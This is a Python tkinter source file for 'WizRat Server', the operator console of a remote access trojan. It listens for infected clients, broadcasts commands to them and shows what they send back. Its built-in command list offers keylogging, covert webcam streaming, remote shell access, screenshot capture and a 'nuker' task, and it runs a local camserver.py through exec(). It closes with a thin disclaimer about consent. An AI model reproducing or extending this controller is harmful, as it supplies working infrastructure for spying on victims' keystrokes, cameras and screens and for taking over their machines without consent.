import socket
import threading
import tkinter as tk
import webbrowser
from tkinter import scrolledtext, Entry, Button, Menu, messagebox
import tkinter.filedialog as filedialog
from PIL import Image
from tkinter.font import Font

class ServerGUI:
    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))

        self.clients = []

        self.window = tk.Tk()
        self.window.title("WizRat Server")

        self.custom_font_size = 12  # Initial font size
        self.min_font_size = 8
        self.max_font_size = 24
        self.custom_font = Font(family="Monospace", size=self.custom_font_size)

        self.text_area = scrolledtext.ScrolledText(self.window, font=self.custom_font, bg="black", fg="#00FF00",
                                                   wrap="word", insertbackground="white", insertwidth=2, padx=10,
                                                   pady=10, highlightbackground="green", highlightcolor="green",
                                                   state="disabled")

        self.text_area.pack(fill=tk.BOTH, expand=True)

        self.text_area.bind("<Control-MouseWheel>", self.zoom_with_mouse_scroll)

        self.image_label = tk.Label(self.window)
        self.image_label.pack(fill=tk.BOTH, expand=True)

        self.input_entry = Entry(self.window)
        self.input_entry.pack(fill=tk.X, padx=5, pady=5)

        self.send_button = Button(self.window, text="Send", command=self.send_message)
        self.send_button.pack()

        self.start_button = Button(self.window, text="Start Server", command=self.start_server)
        self.start_button.pack()

        external_thread = threading.Thread(target=self.show_cam)
        external_thread.start()

        self.cam_button = Button(self.window, text="Show Cam", command=self.show_cam)
        self.cam_button.pack()

        self.cam_button = Button(self.window, text="Show Screenshot", command=self.show_screenshot)
        self.cam_button.pack()

        self.stop_button = Button(self.window, text="Stop Server", command=self.stop_server)
        self.stop_button.pack()

        # Create the main menu bar
        self.menu_bar = Menu(self.window)
        self.window.config(menu=self.menu_bar)

        # Add the "File" menu
        self.file_menu = Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="File", menu=self.file_menu)
        self.file_menu.add_command(label="Save", command=self.save_to_file)
        self.file_menu.add_command(label="Load", command=self.load_from_file)
        self.file_menu.add_separator()
        self.file_menu.add_command(label="Clear", command=self.clear_text_area)
        self.file_menu.add_command(label="Refresh", command=self.refresh_text_area)
        self.file_menu.add_command(label="Reset Connection", command=self.reset_connection)
        self.file_menu.add_separator()
        self.file_menu.add_command(label="Exit", command=self.window.quit)

        # Add the "Help" menu
        self.help_menu = Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="Help", menu=self.help_menu)
        self.help_menu.add_command(label="Command List", command=self.show_command_list)
        self.help_menu.add_command(label="About", command=self.show_about)

        # Add the "View" menu
        self.view_menu = Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="View", menu=self.view_menu)
        self.view_menu.add_command(label="Zoom In", command=self.zoom_in)
        self.view_menu.add_command(label="Zoom Out", command=self.zoom_out)
        self.file_menu.add_separator()
        self.view_menu.add_command(label="Reset View", command=self.reset_view)


        self.screen_label = tk.Label(self.window)
        self.screen_label.pack()

        self.screener_active = False
        self.screener_thread = None

    def start_server(self):
        self.start_button.config(state=tk.DISABLED)
        self.server_socket.listen(5)
        self.update_text_area(r"""                                                                                                                   
                 __          ___     _____       _   
                 \ \        / (_)   |  __ \     | |  
                  \ \  /\  / / _ ___| |__) |__ _| |_ 
                   \ \/  \/ / | |_  /  _  // _` | __|
                    \  /\  /  | |/ /| | \ \ (_| | |_ 
                     \/  \/   |_/___|_|  \_\__,_|\__|
                     by Nandi Mechatronics Pvt. Ltd.                                                                                   
            """)
        self.update_text_area("Main Server started. Listening for connections...\n")
        threading.Thread(target=self.accept_clients).start()


    def show_cam(self):
        wstr = "Wstreamer Cam Server Listening...\n"
        print(wstr)
        self.update_text_area(wstr)
        with open("camserver.py") as f:
            exec(f.read())

    def show_screenshot(self):
        try:
            im = Image.open("monitor-1.png")
            self.update_text_area("Screenshot Opened\n")
            im.show()
        except FileNotFoundError:
            self.update_text_area("Error: Screenshot file not found please send perform screener and try again\n")

    def accept_clients(self):
        while True:
            client_socket, client_address = self.server_socket.accept()
            self.clients.append(client_socket)

            self.update_text_area(f"Client connected: {client_address[0]}:{client_address[1]}\n")
            self.update_client_list()

            threading.Thread(target=self.receive_data, args=(client_socket,)).start()

    def receive_data(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024).decode("utf-8")
                if not data:
                    self.remove_client(client_socket)
                    break

                self.update_text_area(f"Received from {client_socket.getpeername()}: {data}\n")
                self.text_area.see(tk.END)  # Scroll to the end
            except Exception as e:
                self.update_text_area(tk.END, f"Error: " + str(e))
                self.text_area.see(tk.END)  # Scroll to the end
                self.remove_client(client_socket)
                break

    def send_message(self):
        message = self.input_entry.get()
        if message:
            self.input_entry.delete(0, tk.END)
            self.update_text_area( f"Server: {message}\n")
            self.text_area.see(tk.END)  # Scroll to the end
            for client_socket in self.clients:
                try:
                    client_socket.send(message.encode("utf-8"))
                except Exception as e:
                    self.update_text_area( f"Error: " + str(e))
                    self.text_area.see(tk.END)  # Scroll to the end
                    self.remove_client(client_socket)

    def remove_client(self, client_socket):
        client_socket.close()
        self.clients.remove(client_socket)
        self.update_client_list()
        self.update_text_area( "Client disconnected.\n")

    def update_client_list(self):
        self.text_area.delete(1.0, tk.END)
        self.update_text_area( "Connected Clients:\n")
        for idx, client_socket in enumerate(self.clients, start=1):
            client_address = client_socket.getpeername()
            self.update_text_area( f"{idx}. {client_address[0]}:{client_address[1]}\n")

    def clear_text_area(self):
        self.text_area.config(state="normal")
        self.text_area.delete(1.0, tk.END)
        self.text_area.config(state="disabled")

    def refresh_text_area(self):
        self.text_area.destroy()  # Destroy the existing text area widget
        self.text_area = scrolledtext.ScrolledText(self.window)  # Create a new text area widget
        self.text_area.pack(fill=tk.BOTH, expand=True)

    def reset_connection(self):
        for client_socket in self.clients:
            client_socket.close()
        self.clients = []

        self.update_text_area( "Existing client connections closed.\n")

        # Close the server socket
        self.server_socket.close()
        self.update_text_area( "Server socket closed.\n")

        # Create a new server socket and start accepting clients again
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        self.update_text_area( "Server socket reopened. Listening for connections...\n")

        threading.Thread(target=self.accept_clients).start()

    def show_command_list(self):
        command_list = """
                Tasks and Commands:
                
                Hello Task:
                
                Command: perform hello
                Description: Returns a greeting message from the client to the server.
                Show OS Information Task:
                
                Command: perform show_os_info
                Description: Retrieves and returns information about the client's operating system.
                Show Hardware Information Task:
                
                Command: perform show_hw_info
                Description: Retrieves and returns information about the client's hardware (CPU, RAM, Disk).
                Keylogging Task:
                
                Command: perform kstreamer
                Description: Starts capturing and sending keypress events to the server.
                Webcam Streaming Task:
                
                Command: perform wstreamer
                Description: Starts streaming webcam video from the client to the server.
                Shell Access Task:
                
                Command: perform sheller
                Description: Initiates a shell session on the client where the server can send commands to execute.
                Stop Task:
                
                Command: perform stop
                Description: Stops ongoing tasks such as keylogging, webcam streaming, and shell access.
                Screen Sharing Task:
                
                Command: perform screener
                Description: Takes a screenshot of the client's screen and sends it to the server.
                Nuker Task (For demonstration purposes only):
                
                Command: perform nuker
                Description: Initiates a screen sharing feature, sending continuous screenshots to the server.
                Please note that tasks such as "Nuker" or "Screen Sharing" might have significant security and ethical implications, especially in a real-world scenario. Use such features responsibly and only with proper authorization and consent. The descriptions provided above are based on the context of your previous questions and may not cover all the details of each task's functionality.
                """
        messagebox.showinfo("Command List", command_list)

    def show_about(self):
        about_dialog = AboutDialog(self.window)

    def save_to_file(self):
        content = self.text_area.get(1.0, tk.END)
        file_path = filedialog.asksaveasfilename(defaultextension=".wrat", filetypes=[("Wizrat Files", "*.wrat")])

        if file_path:
            with open(file_path, "w") as f:
                f.write(content)

    def update_text_area(self, text):
        self.text_area.config(state="normal")
        self.text_area.insert(tk.END, text)
        self.text_area.config(state="disabled")

    def load_from_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Wizrat Files", "*.wrat")])
        if file_path:
            with open(file_path, "r") as f:
                content = f.read()
                self.text_area.config(state="normal")
                self.text_area.delete(1.0, tk.END)  # Clear existing content
                self.update_text_area( content)

    def zoom_in(self):
        if self.custom_font_size < self.max_font_size:
            self.custom_font_size += 2
            self.update_font()

    def zoom_out(self):
        if self.custom_font_size > self.min_font_size:
            self.custom_font_size -= 2
            self.update_font()

    def reset_view(self):
        self.custom_font_size = 12
        self.update_font()
    def update_font(self):
        self.custom_font.configure(size=self.custom_font_size)
        self.text_area.configure(font=self.custom_font)

    def zoom_with_mouse_scroll(self, event):
        if event.state == 4:  # Control key is pressed
            if event.delta > 0:
                self.zoom_in()
            elif event.delta < 0:
                self.zoom_out()

    def stop_server(self):
        for client_socket in self.clients:
            client_socket.close()
        self.clients = []

        self.update_text_area("Server stopped.\n")

        # Close the server socket
        self.server_socket.close()

        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

        self.update_text_area("Server socket closed.\n")

    def run(self):
        self.window.mainloop()

class AboutDialog(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("About")

        self.message_label = tk.Label(self, text="This is the Server  for Wizrat application.\nVersion 0.6")
        self.message_label.pack(padx=10, pady=10)

        self.website_label = tk.Label(self, text="For more information, visit our website: www.example.com",
                                      cursor="hand2", fg="blue")
        self.website_label.pack(padx=10, pady=5)
        self.website_label.bind("<Button-1>", self.open_website)

        self.contact_label = tk.Label(self, text="Contact us - Send an Email", cursor="hand2", fg="blue")
        self.contact_label.pack(padx=10, pady=5)
        self.contact_label.bind("<Button-1>", self.open_email)

    def open_website(self, event):
        webbrowser.open("https://www.enempl.com")

    def open_email(self, event):
        webbrowser.open("mailto:amitnandileo@gmail.com")



if __name__ == "__main__":
    server = ServerGUI("127.0.0.1", 12345)
    server.run()
